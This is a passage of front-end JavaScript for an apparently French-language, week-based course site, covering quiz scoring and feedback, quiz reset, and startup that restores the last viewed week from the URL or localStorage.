    document.getElementById("quizScore").className = "quiz-score " + (pct >= 70 ? "pass" : "fail");
    if (pct >= 70) {
      toast(`Bravo ! ${correct}/${total} — Quiz réussi 🎉`);
    } else {
      toast(`${correct}/${total} — Relisez la leçon et réessayez.`);
    }
  });

  document.getElementById("quizReset").addEventListener("click", () => {
    quizState[w.id] = { answers: {}, submitted: false };
    saveQuizState(quizState);
    renderMain();
    setTab("quiz");
  });

  if (state.submitted) applyQuizFeedback(w);
}

function applyQuizFeedback(w) {
  const state = quizState[w.id];
  w.quiz.forEach((q, qi) => {
    const qEl = document.querySelector(`#tab-quiz .quiz-question[data-qi="${qi}"]`);
    if (!qEl) return;
    qEl.querySelectorAll(".quiz-option").forEach((optEl, oi) => {
      optEl.classList.remove("correct", "incorrect");
      if (oi === q.correct) optEl.classList.add("correct");
      else if (oi === state.answers[qi]) optEl.classList.add("incorrect");
    });
    const explain = qEl.querySelector(".quiz-explain");
    if (explain) explain.classList.add("show");
  });
}

/* ---------------- Boot ---------------- */
function initApp() {
  renderSidebar("");
  const params = new URLSearchParams(window.location.search);
  const fromUrl = params.get("s");
  const lastWeek = localStorage.getItem("hackinetique_last_week");
  const startId = (fromUrl && getWeekData(fromUrl)) ? fromUrl : (lastWeek && getWeekData(lastWeek) ? lastWeek : COURSE_DATA[0].id);
  // Ne défile vers #cours au chargement que si l'URL contenait un lien direct (?s=S7) ;
  // sinon on laisse l'utilisateur arriver normalement sur la page d'accueil.
  selectWeek(startId, { scroll: !!fromUrl });

  document.getElementById("searchInput").addEventListener("input", (e) => {
    renderSidebar(e.target.value);
  });

  const burger = document.getElementById("navBurger");
  if (burger) {
    burger.addEventListener("click", () => {
      document.getElementById("navLinks").classList.toggle("open");
    });
  }
}

// Utilisé par les liens de la page d'accueil (cartes de phase, boutons CTA)
// pour ouvrir directement une semaine précise dans la section #cours.
function startWeek(id) {
  selectWeek(id);
}

document.addEventListener("DOMContentLoaded", initApp);
